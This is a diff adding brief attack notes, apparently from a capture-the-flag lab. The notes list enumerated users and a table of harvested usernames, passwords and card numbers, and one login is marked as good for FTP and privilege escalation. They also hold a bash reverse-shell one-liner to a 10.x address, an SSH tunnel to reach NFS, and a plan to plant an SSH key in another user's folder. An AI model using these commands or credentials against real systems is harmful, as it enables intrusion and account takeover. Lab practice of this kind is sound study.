@@ -1,0 +1,23 @@
+enumeration
+
+possbible users:
+	- Elf: web server engineer
+	- Paradox: web designer
+	- MuirlandOracle: networking engineer 
+	- NinjaJc01 - James: services admin
+
+credentials:
+	Customer Name			Username				Password			Credit card number	CVC
+	Par. A. Doxx			paradox				ShibesAreGreat123			4111 1111 4555 1142	432  -- works for ftp/and priv escalation --  
+	0day Montgomery			0day				OllieIsTheBestDog			5555 3412 4444 1115	642
+	Muir Land				muirlandoracle		A11D0gsAreAw3s0me			5103 2219 1119 9245	737
+
+	reverse shell: bash -i >& /dev/tcp/10.9.242.55/8888 0>&1
+	
+generate ssh keys using ssh-keygen
+
+ssh -fNv -L 3049:localhost:2049 paradox@10.10.102.206 // nfs using ssh tunneling 
+
+
+after mounting the james folder 
+we need to generate a key for james and ssh into it 
